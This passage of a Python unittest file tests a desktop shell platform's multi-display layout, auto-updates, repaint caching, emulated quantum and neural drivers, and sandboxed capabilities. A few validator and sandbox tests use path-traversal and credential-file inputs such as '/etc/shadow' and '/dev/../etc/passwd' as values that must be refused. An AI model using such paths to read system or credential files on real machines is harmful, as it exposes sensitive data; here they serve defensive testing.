                validate_app_message({"cmd": "request", "action": "workspace", **bad}, "graphical")

    def test_interface_apps_are_on_every_desktop_and_the_base_frame_follows_the_desktop(self):
        s = self.make()
        from kos.shell import Layer
        a, b = socket.socketpair()
        self.addCleanup(lambda: (a.close(), b.close()))
        bar = Layer(id="menubar-1", name="menubar", kind="bar", channel=Channel(a), mode="graphical", rect=list(s.core_rect("menubar")[1]))
        s.layers[bar.id] = bar
        s.window = None
        for n in range(4):
            s.set_workspace(n)
            self.assertTrue(s.shown(bar))
        w = self.window(s, "files", ws=0)
        s.set_workspace(0)
        sig0 = s._base_signature()
        s.set_workspace(1)
        self.assertNotEqual(sig0, s._base_signature())

    def test_open_new_starts_another_instance_and_background_opens_minimized_without_focus(self):
        made = []
        def opener(name, mode, new=False, taken=frozenset()):
            made.append((name, new, set(taken)))
            return Instance(id=f"{name}-{len(made)}", name=name, mode=mode, broker_pid=0, sock_path="", log_path="", started=0)
        s = self.make(opener)
        s._connect = lambda p: Channel(socket.socketpair()[0])
        one = s.open_window("terminal")
        self.assertEqual(len([w for w in s.windows() if w.name == "terminal"]), 1)
        again = s.open_window("terminal")
        self.assertIs(again, one)                                                    # by default: bring the open one forward
        two = s.open_window("terminal", new=True)
        self.assertIsNot(two, one)
        self.assertEqual(len([w for w in s.windows() if w.name == "terminal"]), 2)    # as many as you like
        self.assertTrue(made[-1][1])                                                 # and it asked for a fresh instance
        self.assertIn(one.id, made[-1][2])                                           # never adopting one a window already shows
        focus_before = s.seats[0].focus
        bg = s.open_window("files", background=True)
        self.assertTrue(bg.minimized and not bg.visible)
        self.assertEqual(s.seats[0].focus, focus_before)
        self.assertIn("files", [w["name"] for w in [{"name": l.name} for l in s.layers.values() if l.kind == "window"]])
        self.assertEqual(validate_app_message({"cmd": "request", "action": "open", "app": "files", "mode": "graphical",
                                               "new": True, "background": True}, "graphical")["new"], True)
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "request", "action": "open", "app": "files", "new": "yes"}, "graphical")


class TestExtraDisplays(Env):
    def make(self, sizes=((1280, 720), (800, 600))):
        from kos.display import MultiBackend
        from kos.shell import Shell
        outs = [HeadlessBackend(*s) for s in sizes]
        s = Shell(self.paths, self.authority(PW), MultiBackend(outs), ScriptedDevices(), preboot=())
        s._outs = outs
        return s

    def test_displays_sit_side_by_side_as_one_wide_screen_with_the_panel_on_the_first(self):
        s = self.make()
        self.assertEqual((s.W, s.H), (2080, 720))
        self.assertEqual(s.outputs, [(0, 0, 1280, 720), (1280, 0, 800, 600)])
        self.assertEqual(s.core_rect("menubar")[1], [0, 0, 1280, s.bar_h])                # the panel spans the primary only
        self.assertEqual(s.core_rect("wallpaper")[1], [0, 0, 2080, 720])                  # the wallpaper spans everything
        dx, dy, dw, dh = s.dock_rect()
        self.assertEqual(dx * 2 + dw, 1280)                                               # centred on the primary
        self.assertLessEqual(s.core_rect("sidebar")[1][0] + s.core_rect("sidebar")[1][2], 1280)
        x, y, w, h = s.window_rect()
        self.assertLessEqual(x + w, 1280)                                                 # new windows open on the primary
        self.assertEqual(s.u, 2)                                                          # scale comes from the primary
        single = self.make(((1280, 720),))
        self.assertEqual(single.core_rect("menubar")[1], [0, 0, 1280, single.bar_h])

    def test_each_output_receives_its_own_slice_of_the_frame(self):
        s = self.make()
        fb = Framebuffer(s.W, s.H)
        fb.clear(parse_color("#000000"))
        fb.rect(10, 10, 5, 5, parse_color("#ff0000"))                                     # on the first display
        fb.rect(1290, 10, 5, 5, parse_color("#00ff00"))                                   # on the second
        s.backend.show(fb)
        first, second = s._outs[0].frames[-1], s._outs[1].frames[-1]
        self.assertEqual((first.width, first.height, second.width, second.height), (1280, 720, 800, 600))
        self.assertEqual(first.pixel(12, 12), (255, 0, 0))
        self.assertEqual(second.pixel(12, 12), (0, 255, 0))
        self.assertEqual(second.pixel(5, 5), (0, 0, 0))
        from kos.display import crop
        edge = crop(fb, 2000, 600, 200, 200)                                              # past the edge: black, no crash
        self.assertEqual((edge.width, edge.height), (200, 200))

    def test_the_pointer_can_cross_to_the_second_display_and_a_window_can_be_dragged_there(self):
        s = self.make()
        s.booted.add("mouse")
        s.route({"type": "pointer", "x": 1900, "y": 300})
        self.assertEqual(s.seats[0].pointer, (1900, 300))
        s.route({"type": "pointer", "x": 99999, "y": 99999})
        self.assertEqual(s.seats[0].pointer, (2079, 719))                                 # clamped to the whole wide screen

    def test_the_password_prompt_is_centred_on_the_primary_display_not_the_wide_screen(self):
        from kos.display import Modal
        s = self.make()
        s.show_modal(Modal("Password", ["type it"], secret_len=0))
        s.render()
        shown = s.backend.frames[-1]
        yellow = [(x, y) for y in range(0, 720, 4) for x in range(0, 2080, 4) if shown.pixel(x, y) == (0xff, 0xcc, 0x00)]
        self.assertTrue(yellow)
        self.assertTrue(all(x < 1280 for x, _ in yellow))                                 # the prompt's border is only on the first display
        cx = (min(x for x, _ in yellow) + max(x for x, _ in yellow)) / 2
        self.assertAlmostEqual(cx, 640, delta=40)


class TestAutoUpdate(Env):
    def setUp(self):
        super().setUp()
        AppStore(self.paths).install(self.kapp, self.authority(PW))             # hello 1.0
        self.srv = Path(self.tmp.name) / "srv"
        self.srv.mkdir()
        Sources(self.paths).add(self.authority(PW), "shelf", "folder", str(self.srv))
        self.clock = [1_000_000.0]
        self.fake_os = {"manager": "apt", "packages": [{"name": "linux-image-x", "kind": "kernel"}, {"name": "nvidia-x", "kind": "drivers"}],
                        "counts": {"kernel": 1, "drivers": 1}, "apply": "sudo apt-get update && apt-get upgrade", "note": ""}

    def au(self):
        from kos.autoupdate import AutoUpdate
        return AutoUpdate(self.paths, os_pending=lambda: self.fake_os, now=lambda: self.clock[0])

    def put(self, version, **kw):
        k = make_kapp(Path(self.tmp.name), version, **kw)
        _shutil.copy(k, self.srv / k.name)

    def hello_version(self):
        return {a.name: a.version for a in AppStore(self.paths).installed()}["hello"]

    def test_the_policy_is_sanitised_and_due_follows_the_clock(self):
        au = self.au()
        self.assertEqual((au.policy()["enabled"], au.policy()["mode"]), (False, "ask"))
        self.assertFalse(au.due())                                                  # off: never due
        au.file.write_text(json.dumps({"enabled": True, "mode": "root", "every_hours": 99999, "last_run": "x"}))
        p = au.policy()
        self.assertEqual((p["mode"], p["every_hours"], p["last_run"]), ("ask", 24, 0.0))
        self.assertTrue(au.due())
        au.set(self.authority(), every_hours=6)                                     # a harmless change: no password
        au.file.write_text(json.dumps({"enabled": True, "mode": "ask", "every_hours": 6, "last_run": self.clock[0] - 3600}))
        self.assertFalse(au.due())
        self.clock[0] += 6 * 3600
        self.assertTrue(au.due())

    def test_turning_on_auto_mode_asks_for_the_password(self):
        au = self.au()
        with self.assertRaises(AssertionError):                                     # it asked; the scripted prompter had no answer
            au.set(self.authority(), mode="auto")
        self.assertEqual(au.policy()["mode"], "ask")
        au.set(self.authority(PW), mode="auto")
        self.assertEqual(au.policy()["mode"], "auto")

    def test_a_scheduled_run_never_prompts_it_runs_only_inside_a_covering_sudo_window(self):
        self.put("1.1")
        au = self.au()
        res = au.run(self.authority(), scheduled=True, include_core=False)         # no window: refuses, does not prompt
        self.assertFalse(res["ran"])
        self.assertEqual(self.hello_version(), "1.0")
        a = self.authority(PW)                                                      # the one password: opening the window
        a.sudo_open(5, ("interface", "app"))
        self.assertFalse(au.run(a, scheduled=True, include_core=False)["ran"])      # app but not command: still not enough
        a.sudo_close()
        a = self.authority(PW)
        a.sudo_open(5, ("app", "command"))
        res = au.run(a, scheduled=True, include_core=False)                         # covered: runs with no further password
        self.assertTrue(res["ran"], res)
        self.assertEqual(self.hello_version(), "1.1")
        self.assertTrue(any("kernel" in l and "drivers" in l and "sudo apt-get" in l for l in res["lines"]))   # the OS is listed, not touched
        self.assertGreater(au.policy()["last_run"], 0)
        self.assertIn("granted-sudo", [e["outcome"] for e in a.audit.entries()])
        a.sudo_close()

    def test_an_update_that_asks_for_new_permissions_is_held_back_and_the_os_is_never_changed(self):
        k = make_kapp(Path(self.tmp.name), "1.1", permissions=["network"])
        _shutil.copy(k, self.srv / k.name)
        a = self.authority(PW)
        a.sudo_open(5, ("app", "command"))
        res = self.au().run(a, scheduled=True, include_core=False)
        a.sudo_close()
        self.assertTrue(res["ran"])
        self.assertTrue(any("new permissions" in l and "network" in l for l in res["lines"]), res["lines"])
        self.assertEqual(self.hello_version(), "1.0")                               # held back for review, not installed
        self.assertFalse(any("kos updates" in l and "install" in l for l in res["lines"]))   # and the OS was only listed

    def test_the_os_parsers_sort_kernels_and_drivers_and_never_raise(self):
        from kos import osupdate
        apt = ("Listing...\nlinux-image-6.8.0-45-generic/noble-updates,noble-security 6.8.0-45.45 amd64 [upgradable from: 6.8.0-40.40]\n"
               "libc6/noble-updates 2.39-0ubuntu8.3 amd64 [upgradable from: 2.39-0ubuntu8.2]\n"
               "nvidia-driver-550/noble-updates 550.120 amd64 [upgradable from: 550.107]\n"
               "openssl/noble-security 3.0.13 amd64 [upgradable from: 3.0.12]\nlinux-firmware/noble-updates 20240318 all [upgradable from: 20240201]\n")
        kinds = {p["name"]: p["kind"] for p in osupdate.parse_apt(apt)}
        self.assertEqual(kinds, {"linux-image-6.8.0-45-generic": "kernel", "libc6": "other", "nvidia-driver-550": "drivers",
                                 "openssl": "security", "linux-firmware": "drivers"})
        self.assertEqual([p["name"] for p in osupdate.parse_pacman("linux 6.8.1-1 -> 6.8.2-1\nmesa 24.0-1 -> 24.1-1\n")], ["linux", "mesa"])
        self.assertEqual(osupdate.parse_dnf("kernel-core.x86_64 6.8.9-1 updates\nbash.x86_64 5.2-3 updates\n")[0]["kind"], "kernel")
        def boom(*a, **k):
            raise OSError("no apt here")
        r = osupdate.pending(run=boom, which="apt")
        self.assertEqual((r["packages"], r["manager"]), ([], "apt"))
        self.assertIn("could not ask", r["note"])
        self.assertTrue(r["apply"].startswith("sudo "))                             # it names the root command; it never runs it

    def test_the_bridge_reports_status_refreshes_the_os_and_refuses_an_unattended_run(self):
        from kos.system import SystemBridge
        sent = []
        b = SystemBridge(self.paths)
        b.handle({"cmd": "request", "action": "autoupdate", "op": "status"}, sent.append, self.authority())
        self.assertEqual(sent[-1]["cmd"], "autoupdate")
        self.assertIn("due", sent[-1]["status"])
        self.assertNotIn("os", sent[-1])                                            # status is cheap: it does not call the package manager
        b.handle({"cmd": "request", "action": "autoupdate", "op": "run", "scheduled": True}, sent.append, self.authority())
        self.assertFalse(sent[-1]["ran"])
        for bad in (dict(op="set", mode="root"), dict(op="set", enabled="yes"), dict(op="set", every_hours=0), dict(op="nuke")):
            with self.assertRaises(ProtocolError, msg=bad):
                validate_app_message({"cmd": "request", "action": "autoupdate", **bad}, "graphical")


class TestRegistryRace(Env):
    def inst(self, status):
        return Instance(id="demo-aaaaaa", name="demo", mode="tui", broker_pid=os.getpid(), sock_path="", log_path="", started=0, status=status)

    def test_the_forking_parent_never_overwrites_a_child_that_already_said_running(self):
        """The bug: parent and child both wrote the record after fork(); if the parent was late, 'starting' replaced
        'running' and the app looked stuck until its 5 s start-up timeout (seen on a busy machine)."""
        reg = Registry(self.paths)
        reg.write(self.inst("running"))                          # the child was quick
        self.assertFalse(reg.write_new(self.inst("starting")))   # the late parent must not win
        self.assertEqual(reg.get("demo-aaaaaa").status, "running")
        reg.remove("demo-aaaaaa")
        self.assertTrue(reg.write_new(self.inst("starting")))    # the parent first: it writes, the child will overwrite
        reg.write(self.inst("running"))
        self.assertEqual(reg.get("demo-aaaaaa").status, "running")
        self.assertEqual(list(Path(reg.dir).glob(".*.tmp")), [])  # no temp files left behind


class TestRepaintCost(Env):
    """Glass is the expensive part of a repaint; its cache must be exact - reused when nothing it can see changed,
    redone when something behind it did."""

    def make(self):
        from kos.shell import Shell
        return Shell(self.paths, self.authority(PW), HeadlessBackend(1280, 720), ScriptedDevices(), preboot=())

    def layer(self, s, name, kind, rect, ops=()):
        from kos.shell import Layer, Z
        a, b = socket.socketpair()
        self.addCleanup(lambda: (a.close(), b.close()))
        L = Layer(id=f"{name}-1", name=name, kind=kind, channel=Channel(a), mode="graphical", rect=list(rect), z=Z[kind], ops=list(ops))
        s.layers[L.id] = L
        return L

    def sig(self, s, L):
        return s._signature(L, sorted(s.layers.values(), key=lambda l: l.z))

    def test_an_unrelated_layer_redrawing_does_not_invalidate_a_panels_glass(self):
        s = self.make()
        bar = self.layer(s, "menubar", "bar", s.core_rect("menubar")[1])
        dock = self.layer(s, "dock", "dock", s.core_rect("dock")[1])
        clock = self.layer(s, "widget-clock", "widget", [900, 150, 300, 100], [["rect", 0, 0, 5, 5, "#ffffff"]])
        search = self.layer(s, "search", "plain", [56, 52, 700, 54])
        before = {n: self.sig(s, L) for n, L in (("bar", bar), ("dock", dock))}
        for L in (clock, search):
            L.rev += 1                                                   # each redraws
        self.assertEqual(self.sig(s, bar), before["bar"])               # far from the clock; the search box casts no shadow
        self.assertEqual(self.sig(s, dock), before["dock"])

    def test_a_layer_behind_or_beside_a_panel_that_changes_does_invalidate_it(self):
        s = self.make()
        side = self.layer(s, "sidebar", "sidebar", s.core_rect("sidebar")[1])
        below = self.layer(s, "pins", "plain", [800, 300, 100, 100])    # overlaps the panel's left edge and sits under it
        a = self.sig(s, side)
        below.rev += 1
        self.assertNotEqual(self.sig(s, side), a)
        a = self.sig(s, side)
        below.rect[0] += 3                                               # moved
        self.assertNotEqual(self.sig(s, side), a)
        a = self.sig(s, side)
        side.rect[3] -= 10                                               # the panel itself resized
        self.assertNotEqual(self.sig(s, side), a)
        win = self.layer(s, "files", "window", [700, 200, 200, 200])     # a window's shadow reaches further than its rectangle
        win.z = 5
        a = self.sig(s, side)
        win.rev += 1
        self.assertNotEqual(self.sig(s, side), a)

    def test_cached_and_recomputed_glass_look_identical(self):
        """The cache must never change a pixel: compare a repaint that reuses it with one that rebuilds everything."""
        s = self.make()
        self.layer(s, "menubar", "bar", s.core_rect("menubar")[1], [["rect", 4, 4, 40, 10, "#00ff00"]])
        self.layer(s, "dock", "dock", s.core_rect("dock")[1], [["rect", 4, 4, 40, 10, "#ff0000"]])
        clock = self.layer(s, "widget-clock", "widget", [900, 150, 300, 100], [["rect", 0, 0, 50, 50, "#ffffff"]])
        self.layer(s, "search", "plain", [56, 52, 700, 54], [["rect", 0, 0, 300, 20, "#0000ff"]])
        first = bytes(s.compose().buf)
        clock.ops = [["rect", 0, 0, 80, 80, "#ff00ff"]]
        clock.rev += 1
        reused = bytes(s.compose().buf)                                 # glass of the others came from the cache
        for L in s.layers.values():
            L.cache = None
        s._base = None
        rebuilt = bytes(s.compose().buf)                                # everything from scratch
        self.assertEqual(reused, rebuilt)
        self.assertNotEqual(first, reused)


class TestQuantumHardwareLayer(Env):
    DRIVERS = Path(__file__).resolve().parent.parent / "examples" / "drivers"

    def install_driver(self, src, **manifest):
        import shutil
        d = Path(tempfile.mkdtemp(dir=self.tmp.name)) / "src"
        shutil.copytree(src, d)
        if manifest:
            m = json.loads((d / "manifest.json").read_text())
            m.update(manifest)
            (d / "manifest.json").write_text(json.dumps(m))
        out = Path(self.tmp.name) / f"{json.loads((d / 'manifest.json').read_text())['name']}.kapp"
        pack(d, out)
        name = KApp.from_file(out).manifest.name
        AppStore(self.paths).install(out, self.authority(PW))
        from kos.permit import PermitStore
        PermitStore(self.paths).grant(name)
        return name

    def fake_machine(self):
        root = Path(tempfile.mkdtemp(dir=self.tmp.name))
        (root / "dev").mkdir()
        for n in ("qpu0", "quantum1", "qrng0", "null", "sda"):
            (root / "dev" / n).write_text("")
        (root / "sys/class/misc/hw_random").mkdir(parents=True)
        (root / "sys/class/misc/hw_random/rng_available").write_text("tpm-rng-0 Quantis-PCIe-16M intel-rng\n")
        (root / "sys/class/photonic_chip").mkdir(parents=True)
        (root / "sys/class/photonic_chip/photonic-ctl0").write_text("")
        (root / "sys/class/net").mkdir(parents=True)
        (root / "sys/class/net/eth0").write_text("")
        pci = root / "sys/bus/pci/devices/0000:03:00.0"
        pci.mkdir(parents=True)
        (pci / "vendor").write_text("0x1234\n")
        (pci / "device").write_text("0xabcd\n")
        (root / "etc/kos").mkdir(parents=True)
        (root / "etc/kos/quantum-devices.json").write_text(json.dumps(
            [{"id": "1234:abcd", "kind": "photonic", "name": "Acme photonic accelerator", "node": "/dev/qpu0", "driver": "acme-driver"},
             {"id": "ffff:ffff", "name": "not present"}, "junk", {"id": 5}]))
        return root

    def test_detection_finds_only_what_looks_quantum_and_never_opens_anything(self):
        from kos import qdev
        found = {d.id: d for d in qdev.detect(str(self.fake_machine()))}
        self.assertEqual(sorted(found), ["pci:0000:03:00.0", "qpu:qpu0", "qrng:Quantis-PCIe-16M", "qrng:qrng0",
                                         "quantum:quantum1", "sysfs:photonic_chip/photonic-ctl0"])
        self.assertEqual(found["qpu:qpu0"].node, "/dev/qpu0")
        self.assertEqual(found["pci:0000:03:00.0"].driver, "acme-driver")                # from the registry the owner wrote
        self.assertNotIn("qrng:tpm-rng-0", found)                                          # an ordinary RNG is not quantum hardware
        self.assertNotIn("qrng:intel-rng", found)
        self.assertFalse(any("eth0" in k or "sda" in k or "null" in k for k in found))
        self.assertEqual(qdev.detect(str(Path(self.tmp.name) / "nothing-here")), [])      # no hardware: an empty list, not an error

    def test_no_hardware_is_reported_as_no_hardware_and_the_emulator_is_never_called_hardware(self):
        from kos import qdev
        self.assertEqual(qdev.with_drivers([], self.paths), [])
        name = self.install_driver(self.DRIVERS / "qsim")
        devs = qdev.with_drivers([], self.paths)
        self.assertEqual([(d.id, d.real, d.drivers) for d in devs], [(f"emulator:{name}", False, [name])])
        self.assertIn("EMULATOR", devs[0].name)
        self.assertFalse(any(d.real for d in devs))

    def test_a_driver_is_matched_to_the_device_node_it_names(self):
        from kos import qdev
        mine = self.install_driver(self.DRIVERS / "qsim", name="my-qpu-driver", devices=["/dev/qpu*"])
        other = self.install_driver(self.DRIVERS / "qsim", name="other-driver", devices=["/dev/photonic*"])
        devs = {d.id: d for d in qdev.with_drivers(qdev.detect(str(self.fake_machine())), self.paths)}
        self.assertEqual(devs["qpu:qpu0"].drivers, [mine])
        self.assertEqual(devs["quantum:quantum1"].drivers, [])                           # nobody serves it: said plainly
        self.assertNotIn(other, devs["qpu:qpu0"].drivers)

    def test_manifest_devices_are_validated(self):
        base = {"name": "d", "version": "1", "runtime": "python", "entry": "m", "driver": "quantum"}
        from kos.kapp import Manifest
        ok = Manifest.parse(json.dumps({**base, "devices": ["/dev/qpu*", "/dev/qpu0"]}).encode())
        self.assertEqual(ok.devices, ("/dev/qpu*", "/dev/qpu0"))
        for bad in (["/etc/shadow"], ["/dev/../etc/passwd"], ["qpu0"], ["/dev/a b"], ["/dev/x"] * 5, "/dev/qpu0"):
            with self.assertRaises(KAppError, msg=bad):
                Manifest.parse(json.dumps({**base, "devices": bad}).encode())
        with self.assertRaises(KAppError):
            Manifest.parse(json.dumps({**base, "driver": "toaster"}).encode())

    def test_the_emulator_runs_a_job_in_the_sandbox_and_says_it_is_an_emulator(self):
        from kos import qjob
        name = self.install_driver(self.DRIVERS / "qsim")
        res = qjob.run_job(self.paths, self.authority(PW), name, {"program": "qubit[2] q;\nbit[2] c;\nh q[0];\ncx q[0], q[1];\nc = measure q;", "shots": 400, "seed": 3})
        self.assertTrue(res["emulated"])
        self.assertEqual(set(res["counts"]), {"00", "11"})                                  # a Bell pair: only 00 and 11
        self.assertEqual(sum(res["counts"].values()), 400)
        self.assertAlmostEqual(res["counts"]["00"] / 400, 0.5, delta=0.12)
        flip = qjob.run_job(self.paths, self.authority(PW), name, {"program": "qreg q[3]; creg c[3]; x q[0]; x q[2]; measure q -> c;", "shots": 20})
        self.assertEqual(flip["counts"], {"101": 20})
        bad = qjob.run_job(self.paths, self.authority(PW), name, {"program": "qreg q[1]; wibble q[0];", "shots": 1})
        self.assertIn("unknown gate", bad["error"])                                          # a bad circuit is an answer, not a crash

    def test_job_inputs_are_checked_and_a_non_driver_is_refused(self):
        from kos import qjob
        name = self.install_driver(self.DRIVERS / "qsim")
        for bad in ({"program": ""}, {"program": "x" * (65 << 10)}, {"program": "h q;", "shots": 0},
                    {"program": "h q;", "shots": 10 ** 7}, {"program": "h q;", "shots": True}, {"program": 5}):
            with self.assertRaises(qjob.JobError, msg=str(bad)[:30]):
                qjob.run_job(self.paths, self.authority(PW), name, bad)
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        from kos.permit import PermitStore
        PermitStore(self.paths).grant("hello")
        with self.assertRaises(qjob.JobError):
            qjob.run_job(self.paths, self.authority(PW), "hello", {"program": "qreg q[1];"})

    def test_a_device_node_is_opened_to_the_driver_only_after_asking_and_only_that_node(self):
        """Real Landlock: /dev/zero is unreachable for an app, reachable for exactly the driver you agreed to give it to."""
        from kos import qjob
        d = Path(tempfile.mkdtemp(dir=self.tmp.name)) / "probe"
        d.mkdir()
        (d / "manifest.json").write_text(json.dumps({"name": "probe-driver", "version": "1", "runtime": "python", "entry": "probe:main",
                                                      "modes": ["cmd"], "driver": "quantum", "devices": ["/dev/zero"]}))
        (d / "probe.py").write_text(
            "import json\nfrom kos.sdk import App\n\n\ndef main():\n    app = App()\n    for ev in app.events():\n"
            "        if ev.get('command') != 'job':\n            continue\n        out = {'emulated': False, 'counts': {}, 'shots': 1}\n"
            "        for path in ('/dev/zero', '/dev/random', '/etc/hostname'):\n            try:\n"
            "                with open(path, 'rb') as f:\n                    f.read(4)\n                out['counts'][path] = 1\n"
            "            except OSError:\n                out['counts'][path] = 0\n"
            "        app.log('RESULT ' + json.dumps(out))\n        app.exit(0)\n        break\n")
        out = Path(self.tmp.name) / "probe.kapp"
        pack(d, out)
        AppStore(self.paths).install(out, self.authority(PW))
        from kos.permit import PermitStore
        PermitStore(self.paths).grant("probe-driver")
        with self.assertRaises(qjob.JobError):                                            # you said no to the device
            qjob.run_job(self.paths, self.authority(PW, False), "probe-driver", {"program": "x"})
        res = qjob.run_job(self.paths, self.authority(PW, True, PW), "probe-driver", {"program": "x"})   # password, confirm, password
        self.assertEqual(res["counts"], {"/dev/zero": 1, "/dev/random": 0, "/etc/hostname": 0})        # that node, not the rest

    def test_the_bridge_lists_devices_runs_jobs_and_refuses_bad_requests(self):
        from kos.system import SystemBridge
        name = self.install_driver(self.DRIVERS / "qsim")
        sent = []
        b = SystemBridge(self.paths)
        b.handle({"cmd": "request", "action": "quantum", "op": "devices"}, sent.append, self.authority())
        self.assertEqual(sent[-1]["cmd"], "quantum")
        self.assertTrue(any(d["id"] == f"emulator:{name}" and not d["real"] for d in sent[-1]["devices"]))
        b.handle({"cmd": "request", "action": "quantum", "op": "run", "program": "qreg q[1]; creg c[1]; x q[0]; measure q -> c;",
                  "shots": 5, "driver": "", "device": ""}, sent.append, self.authority(PW))
        self.assertEqual(sent[-1]["result"]["counts"], {"1": 5})
        for bad in (dict(op="run", program=""), dict(op="run", program="h q;", shots=0), dict(op="run", program="h q;", driver="../x"), dict(op="teleport")):
            with self.assertRaises(ProtocolError, msg=bad):
                validate_app_message({"cmd": "request", "action": "quantum", **bad}, "graphical")


from kos.kapp import Manifest  # noqa: E402


class TestEmulatorsAndPolygons(Env):
    """Libraries and emulators that survived the move of the looks into interface apps."""

    def test_a_polygon_larger_than_the_screen_or_half_off_it_is_clipped_not_a_crash(self):
        fb = Framebuffer(40, 40)
        fb.poly([[-500, -500], [900, -400], [800, 900], [-300, 700]], "#ffffff", 255)                   # covers everything
        self.assertEqual((fb.pixel(0, 0), fb.pixel(20, 20), fb.pixel(39, 39)), ((255, 255, 255),) * 3)
        edge = Framebuffer(40, 40)
        edge.poly([[30, 30], [90, 30], [90, 90], [30, 90]], "#ffffff", 255)                              # half off the bottom right
        self.assertEqual((edge.pixel(35, 35), edge.pixel(39, 39), edge.pixel(10, 10)), ((255, 255, 255), (255, 255, 255), (0, 0, 0)))
        none = Framebuffer(40, 40)
        none.poly([[100, 100], [200, 100], [200, 200]], "#ffffff", 255)                                  # entirely off
        self.assertEqual(none.pixel(20, 20), (0, 0, 0))

    def test_only_a_neural_driver_may_hold_the_neural_permission(self):
        base = {"name": "x", "version": "1", "runtime": "python", "entry": "m", "modes": ["graphical"]}
        Manifest.parse(json.dumps({**base, "permissions": ["neural"], "driver": "neural"}).encode())
        for extra in ({"permissions": ["neural"]}, {"permissions": ["neural"], "driver": "camera"},
                      {"driver": "toaster"}):
            with self.assertRaises(KAppError, msg=str(extra)):
                Manifest.parse(json.dumps({**base, **extra}).encode())
        for kind in ("xr", "camera", "neural", "quantum"):
            Manifest.parse(json.dumps({**base, "driver": kind}).encode())

    def test_the_neural_emulator_sends_only_the_five_decisions_and_draws_valid_frames(self):
        import importlib.util
        import select
        drv = Path(__file__).resolve().parent.parent / "examples" / "drivers" / "neurosim" / "driver.py"
        spec = importlib.util.spec_from_file_location("neurosim_driver", drv)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        a, b = socket.socketpair()
        old = os.environ.get("KOS_CHANNEL_FD")
        os.environ["KOS_CHANNEL_FD"] = str(b.detach())               # the app takes over this descriptor and owns it
        t = threading.Thread(target=mod.main, daemon=True)
        t.start()
        try:
            ch = Channel(a)
            ch.send({"cmd": "hello", "mode": "graphical", "width": 360, "height": 160, "scale": 1})
            ch.send({"cmd": "tick", "t": 1})
            seen, deadline = [], _time.time() + 5
            while _time.time() < deadline and not any(m["cmd"] == "frame" for m in seen):
                select.select([ch], [], [], 0.2)
                seen += [validate_app_message(m, "graphical") for m in ch.receive()]
            frame = next(m for m in seen if m["cmd"] == "frame")
            hits = [op for op in frame["ops"] if op[0] == "hit"]
            self.assertEqual(len(hits), 5)                                       # five buttons, one per decision
            x, y = hits[2][1] + 2, hits[2][2] + 2                                # "select"
            ch.send({"cmd": "button", "button": "left", "pressed": True, "x": x, "y": y})
            deadline = _time.time() + 5
            while _time.time() < deadline and not any(m.get("action") == "intent" for m in seen):
                select.select([ch], [], [], 0.2)
                seen += [validate_app_message(m, "graphical") for m in ch.receive()]
            self.assertEqual([m["name"] for m in seen if m.get("action") == "intent"], ["select"])
            ch.send({"cmd": "quit"})
        finally:
            if old is None:
                os.environ.pop("KOS_CHANNEL_FD", None)
            else:
                os.environ["KOS_CHANNEL_FD"] = old
            a.close()

    def test_the_emulators_are_valid_and_say_what_they_are(self):
        root = Path(__file__).resolve().parent.parent / "examples" / "drivers"
        for name in ("camsim", "neurosim"):
            m = Manifest.parse((root / name / "manifest.json").read_bytes())
            self.assertIn("EMULATOR", m.description.upper())


class TestScopedCapabilities(Env):
    """Nothing has power over everything: the 'system' permission is a list of scopes, and each app holds only its own."""

    def test_every_built_in_app_holds_exactly_the_scopes_its_code_uses(self):
        from kos import services
        for d in sorted(SYSTEM_DIR.iterdir()):
            if not d.is_dir():
                continue
            m = Manifest.parse((d / "manifest.json").read_bytes())
            self.assertNotIn("*", m.scopes, d.name)                                # none holds the bare permission
            self.assertEqual(set(m.scopes), services.scopes_needed(d), d.name)     # no more, no less than its code asks for

    def test_a_scoped_bridge_answers_its_own_scope_and_refuses_the_rest(self):
        sent = []
        bridge = SystemBridge(self.paths, scopes=frozenset({"os"}))
        bridge.handle({"cmd": "request", "action": "sys", "kind": "resources", "arg": ""}, sent.append, self.authority())
        self.assertNotEqual(sent[-1].get("ok"), False)
        for req in ({"action": "backups"}, {"action": "ls", "path": "/"}, {"action": "signal", "pid": 1, "sig": "TERM"},
                    {"action": "permit", "app": "hello"}, {"action": "line", "text": "print(1)"},
                    {"action": "updates", "op": "check"}, {"action": "apps"}, {"action": "mods", "op": "list"},
                    {"action": "sudo", "op": "status"}, {"action": "heal", "op": "check"}):
            sent.clear()
            bridge.handle({"cmd": "request", **req}, sent.append, self.authority())
            self.assertFalse(sent[-1]["ok"], req)
            self.assertIn("system:", sent[-1]["detail"], req)
        every = SystemBridge(self.paths, scopes=frozenset({"*"}))
        sent.clear()
        every.handle({"cmd": "request", "action": "apps"}, sent.append, self.authority())
        self.assertEqual(sent[-1]["cmd"], "apps")                                  # the old bare permission still works

    def test_manifests_accept_only_real_scopes_and_mods_cannot_reach_beyond_their_slot(self):
        base = {"name": "x", "version": "1", "runtime": "python", "entry": "m", "modes": ["graphical"]}
        ok = Manifest.parse(json.dumps({**base, "permissions": ["system:apps", "system:os"]}).encode())
        self.assertEqual(ok.scopes, {"apps", "os"})
        self.assertEqual(Manifest.parse(json.dumps({**base, "permissions": ["system"]}).encode()).scopes, {"*"})
        for bad in (["system:everything"], ["system:"], ["system:apps:extra"], [5]):
            with self.assertRaises(KAppError, msg=str(bad)):
                Manifest.parse(json.dumps({**base, "permissions": bad}).encode())
        from kos import mods
        dock = Manifest.parse(json.dumps({**base, "slot": "dock", "permissions": ["shell", "system:apps", "system:backup"]}).encode())
        with self.assertRaises(KAppError):
            mods.check(KApp(dock, b"", {}) if False else type("A", (), {"manifest": dock})())      # a dock may not push backups
        fine = Manifest.parse(json.dumps({**base, "slot": "dock", "permissions": ["shell", "system:apps"]}).encode())
        self.assertEqual(mods.check(type("A", (), {"manifest": fine})()), "dock")
        blanket = Manifest.parse(json.dumps({**base, "slot": "dock", "permissions": ["system"]}).encode())
        with self.assertRaises(KAppError):
            mods.check(type("A", (), {"manifest": blanket})())                      # and the bare permission fits no slot

    def test_a_layer_without_the_scope_is_refused_and_is_not_sent_what_it_may_not_see(self):
        sh = TestLooksAndControls.make(self)
        dock = self.layer_of(sh, "dock", system=True, scopes=frozenset({"apps"}))
        side = self.layer_of(sh, "sidebar", system=True, scopes=frozenset({"apps"}))
        self.assertFalse(dock.allows("links"))
        self.assertTrue(dock.allows("open"))
        sh._on_request(side, {"cmd": "request", "action": "notify", "op": "post", "title": "x", "body": "y"})
        self.assertEqual(sh.notes, [])                                              # no system:notify: refused
        refusal = self.sent(side)
